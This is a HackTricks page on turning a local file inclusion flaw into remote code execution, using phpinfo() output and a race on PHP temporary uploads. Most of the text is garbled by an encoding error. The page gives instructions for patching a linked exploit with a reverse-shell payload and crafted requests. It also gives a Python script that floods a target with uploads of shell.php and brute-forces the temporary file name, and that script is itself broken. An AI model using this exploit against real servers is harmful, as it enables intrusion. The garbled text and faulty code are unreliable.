{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}


Î“Î¹Î± Î½Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯Ï„Îµ Î±Ï…Ï„Î®Î½ Ï„Î·Î½ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î± Ï‡ÏÎµÎ¹Î¬Î¶ÎµÏƒÏ„Îµ: **ÎœÎ¹Î± ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î± LFI, Î¼Î¹Î± ÏƒÎµÎ»Î¯Î´Î± ÏŒÏ€Î¿Ï… ÎµÎ¼Ï†Î±Î½Î¯Î¶ÎµÏ„Î±Î¹ Ï„Î¿ phpinfo(), "file\_uploads = on" ÎºÎ±Î¹ Î¿ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î®Ï‚ Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î³ÏÎ¬ÏˆÎµÎ¹ ÏƒÏ„Î¿Î½ Ï†Î¬ÎºÎµÎ»Î¿ "/tmp".**

[https://www.insomniasec.com/downloads/publications/phpinfolfi.py](https://www.insomniasec.com/downloads/publications/phpinfolfi.py)

**Tutorial HTB**: [https://www.youtube.com/watch?v=rs4zEwONzzk\&t=600s](https://www.youtube.com/watch?v=rs4zEwONzzk\&t=600s)

Î ÏÎ­Ï€ÎµÎ¹ Î½Î± Î´Î¹Î¿ÏÎ¸ÏÏƒÎµÏ„Îµ Ï„Î·Î½ ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ· (Î±Î»Î»Î¬Î¾Ï„Îµ **=>** ÏƒÎµ **=>**). Î“Î¹Î± Î½Î± Ï„Î¿ ÎºÎ¬Î½ÎµÏ„Îµ Î±Ï…Ï„ÏŒ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎºÎ¬Î½ÎµÏ„Îµ:
```
sed -i 's/\[tmp_name\] \=>/\[tmp_name\] =\&gt/g' phpinfolfi.py
```
You have to change also the **payload** at the beginning of the exploit (for a php-rev-shell for example), the **REQ1** (this should point to the phpinfo page and should have the padding included, i.e.: _REQ1="""POST /install.php?mode=phpinfo\&a="""+padding+""" HTTP/1.1_), and **LFIREQ** (this should point to the LFI vulnerability, i.e.: _LFIREQ="""GET /info?page=%s%%00 HTTP/1.1\r --_ Check the double "%" when exploiting null char)

{% file src="../../.gitbook/assets/LFI-With-PHPInfo-Assistance.pdf" %}

### Theory

Î‘Î½ Î¿Î¹ Î±Î½Î±Ï†Î¿ÏÎ­Ï‚ ÎµÏ€Î¹Ï„ÏÎ­Ï€Î¿Î½Ï„Î±Î¹ ÏƒÎµ PHP ÎºÎ±Î¹ Ï€ÏÎ¿ÏƒÏ€Î±Î¸Î®ÏƒÎµÏ„Îµ Î½Î± Î±Î½ÎµÎ²Î¬ÏƒÎµÏ„Îµ Î­Î½Î± Î±ÏÏ‡ÎµÎ¯Î¿, Î±Ï…Ï„ÏŒ Ï„Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ Î±Ï€Î¿Î¸Î·ÎºÎµÏÎµÏ„Î±Î¹ ÏƒÎµ Î­Î½Î±Î½ Ï€ÏÎ¿ÏƒÏ‰ÏÎ¹Î½ÏŒ Ï†Î¬ÎºÎµÎ»Î¿ Î¼Î­Ï‡ÏÎ¹ Î½Î± Î¿Î»Î¿ÎºÎ»Î·ÏÏ‰Î¸ÎµÎ¯ Î· ÎµÏ€ÎµÎ¾ÎµÏÎ³Î±ÏƒÎ¯Î± Ï„Î¿Ï… Î±Î¹Ï„Î®Î¼Î±Ï„Î¿Ï‚ Î±Ï€ÏŒ Ï„Î¿Î½ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î®, ÏƒÏ„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î± Î±Ï…Ï„ÏŒ Ï„Î¿ Ï€ÏÎ¿ÏƒÏ‰ÏÎ¹Î½ÏŒ Î±ÏÏ‡ÎµÎ¯Î¿ Î´Î¹Î±Î³ÏÎ¬Ï†ÎµÏ„Î±Î¹.

Î£Ï„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î±, Î±Î½ Î­Ï‡ÎµÏ„Îµ Î²ÏÎµÎ¹ Î¼Î¹Î± ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î± LFI ÏƒÏ„Î¿Î½ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î® Î¹ÏƒÏ„Î¿Ï Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï€ÏÎ¿ÏƒÏ€Î±Î¸Î®ÏƒÎµÏ„Îµ Î½Î± Î¼Î±Î½Ï„Î­ÏˆÎµÏ„Îµ Ï„Î¿ ÏŒÎ½Î¿Î¼Î± Ï„Î¿Ï… Ï€ÏÎ¿ÏƒÏ‰ÏÎ¹Î½Î¿Ï Î±ÏÏ‡ÎµÎ¯Î¿Ï… Ï€Î¿Ï… Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®Î¸Î·ÎºÎµ ÎºÎ±Î¹ Î½Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯Ï„Îµ Î¼Î¹Î± RCE Î±Ï€Î¿ÎºÏ„ÏÎ½Ï„Î±Ï‚ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î¿ Ï€ÏÎ¿ÏƒÏ‰ÏÎ¹Î½ÏŒ Î±ÏÏ‡ÎµÎ¯Î¿ Ï€ÏÎ¹Î½ Î´Î¹Î±Î³ÏÎ±Ï†ÎµÎ¯.

Î£Ï„Î± **Windows** Ï„Î± Î±ÏÏ‡ÎµÎ¯Î± Î±Ï€Î¿Î¸Î·ÎºÎµÏÎ¿Î½Ï„Î±Î¹ ÏƒÏ…Î½Î®Î¸Ï‰Ï‚ ÏƒÏ„Î¿ **C:\Windows\temp\php**

Î£Ï„Î¿ **linux** Ï„Î¿ ÏŒÎ½Î¿Î¼Î± Ï„Î¿Ï… Î±ÏÏ‡ÎµÎ¯Î¿Ï… ÏƒÏ…Î½Î®Î¸Ï‰Ï‚ ÎµÎ¯Î½Î±Î¹ **Ï„Ï…Ï‡Î±Î¯Î¿** ÎºÎ±Î¹ Î²ÏÎ¯ÏƒÎºÎµÏ„Î±Î¹ ÏƒÏ„Î¿ **/tmp**. Î”ÎµÎ´Î¿Î¼Î­Î½Î¿Ï… ÏŒÏ„Î¹ Ï„Î¿ ÏŒÎ½Î¿Î¼Î± ÎµÎ¯Î½Î±Î¹ Ï„Ï…Ï‡Î±Î¯Î¿, ÎµÎ¯Î½Î±Î¹ Î±Ï€Î±ÏÎ±Î¯Ï„Î·Ï„Î¿ Î½Î± **ÎµÎ¾Î¬Î³ÎµÏ„Îµ Î±Ï€ÏŒ ÎºÎ¬Ï€Î¿Ï… Ï„Î¿ ÏŒÎ½Î¿Î¼Î± Ï„Î¿Ï… Ï€ÏÎ¿ÏƒÏ‰ÏÎ¹Î½Î¿Ï Î±ÏÏ‡ÎµÎ¯Î¿Ï…** ÎºÎ±Î¹ Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÏ„Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ Î±Ï…Ï„ÏŒ Ï€ÏÎ¹Î½ Î´Î¹Î±Î³ÏÎ±Ï†ÎµÎ¯. Î‘Ï…Ï„ÏŒ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î³Î¯Î½ÎµÎ¹ Î´Î¹Î±Î²Î¬Î¶Î¿Î½Ï„Î±Ï‚ Ï„Î·Î½ Ï„Î¹Î¼Î® Ï„Î·Ï‚ **Î¼ÎµÏ„Î±Î²Î»Î·Ï„Î®Ï‚ $\_FILES** Î¼Î­ÏƒÎ± ÏƒÏ„Î¿ Ï€ÎµÏÎ¹ÎµÏ‡ÏŒÎ¼ÎµÎ½Î¿ Ï„Î·Ï‚ ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ·Ï‚ "**phpconfig()**".

**phpinfo()**

**PHP** Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ Î­Î½Î± buffer **4096B** ÎºÎ±Î¹ ÏŒÏ„Î±Î½ ÎµÎ¯Î½Î±Î¹ **Î³ÎµÎ¼Î¬Ï„Î¿**, Î±Ï€Î¿ÏƒÏ„Î­Î»Î»ÎµÏ„Î±Î¹ **ÏƒÏ„Î¿Î½ Ï€ÎµÎ»Î¬Ï„Î·**. Î£Ï„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î±, Î¿ Ï€ÎµÎ»Î¬Ï„Î·Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± **ÏƒÏ„ÎµÎ¯Î»ÎµÎ¹** **Ï€Î¿Î»Î»Î­Ï‚ Î¼ÎµÎ³Î¬Î»ÎµÏ‚ Î±Î¹Ï„Î®ÏƒÎµÎ¹Ï‚** (Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Î¼ÎµÎ³Î¬Î»ÎµÏ‚ ÎºÎµÏ†Î±Î»Î¯Î´ÎµÏ‚) **Î±Î½ÎµÎ²Î¬Î¶Î¿Î½Ï„Î±Ï‚ Î­Î½Î± php** reverse **shell**, Ï€ÎµÏÎ¹Î¼Î­Î½Î¿Î½Ï„Î±Ï‚ Î½Î± **ÎµÏ€Î¹ÏƒÏ„ÏÎ±Ï†ÎµÎ¯ Ï„Î¿ Ï€ÏÏÏ„Î¿ Î¼Î­ÏÎ¿Ï‚ Ï„Î¿Ï… phpinfo()** (ÏŒÏ€Î¿Ï… ÎµÎ¯Î½Î±Î¹ Ï„Î¿ ÏŒÎ½Î¿Î¼Î± Ï„Î¿Ï… Ï€ÏÎ¿ÏƒÏ‰ÏÎ¹Î½Î¿Ï Î±ÏÏ‡ÎµÎ¯Î¿Ï…) ÎºÎ±Î¹ Î½Î± Ï€ÏÎ¿ÏƒÏ€Î±Î¸Î®ÏƒÎµÎ¹ Î½Î± **Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÎ¹ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î¿ Ï€ÏÎ¿ÏƒÏ‰ÏÎ¹Î½ÏŒ Î±ÏÏ‡ÎµÎ¯Î¿** Ï€ÏÎ¹Î½ Î¿ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î®Ï‚ php Î´Î¹Î±Î³ÏÎ¬ÏˆÎµÎ¹ Ï„Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…ÏŒÎ¼ÎµÎ½Î¿Ï‚ Î¼Î¹Î± ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î± LFI.

**Python script to try to bruteforce the name (if length = 6)**
```python
import itertools
import requests
import sys

print('[+] Trying to win the race')
f = {'file': open('shell.php', 'rb')}
for _ in range(4096 * 4096):
requests.post('http://target.com/index.php?c=index.php', f)


print('[+] Bruteforcing the inclusion')
for fname in itertools.combinations(string.ascii_letters + string.digits, 6):
url = 'http://target.com/index.php?c=/tmp/php' + fname
r = requests.get(url)
if 'load average' in r.text:  # <?php echo system('uptime');
print('[+] We have got a shell: ' + url)
sys.exit(0)

print('[x] Something went wrong, please try again')
```
{% hint style="success" %}
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Î¥Ï€Î¿ÏƒÏ„Î®ÏÎ¹Î¾Î· HackTricks</summary>

* Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î± [**ÏƒÏ‡Î­Î´Î¹Î± ÏƒÏ…Î½Î´ÏÎ¿Î¼Î®Ï‚**](https://github.com/sponsors/carlospolop)!
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·Î½** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î·Î½ [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ ÎºÏŒÎ»Ï€Î± hacking Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
